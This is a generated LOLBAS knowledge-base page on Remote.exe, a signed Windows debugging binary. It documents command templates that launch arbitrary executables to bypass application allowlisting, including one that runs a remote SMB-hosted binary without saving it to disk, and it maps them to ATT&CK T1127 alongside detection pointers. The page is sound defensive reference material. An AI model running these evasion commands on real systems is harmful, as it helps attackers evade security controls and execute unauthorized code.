---
title: "Remote.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Remote.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Remote.yml"
build_date: "2026-04-27 19:14:21"
category: "OtherMSBinaries"
aliases:
  - "Remote.exe"
functions:
  - "AWL Bypass"
  - "Execute"
attack_technique_ids:
  - "T1127"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Debugging tool included with Windows Debugging Tools

## Paths

- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe`

## Commands

### 1. AWL Bypass

Spawns specified executable as a child process of remote.exe

```cmd
Remote.exe /s {PATH:.exe} anythinghere
```

- Use Case: Executes a process under a trusted Microsoft signed binary
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution|T1127: Trusted Developer Utilities Proxy Execution]]

### 2. Execute

Spawns specified executable as a child process of remote.exe

```cmd
Remote.exe /s {PATH:.exe} anythinghere
```

- Use Case: Executes a process under a trusted Microsoft signed binary
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution|T1127: Trusted Developer Utilities Proxy Execution]]

### 3. Execute

Run a remote file

```cmd
Remote.exe /s {PATH_SMB:.exe} anythinghere
```

- Use Case: Executing a remote binary without saving file to disk
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution|T1127: Trusted Developer Utilities Proxy Execution]]

## Detections

- IOC: remote.exe process spawns
- Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml

## Resources

- {'Link': 'https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/'}

## Acknowledgements

- {'Person': 'mr.d0x', 'Handle': '@mrd0x'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Remote.yml)
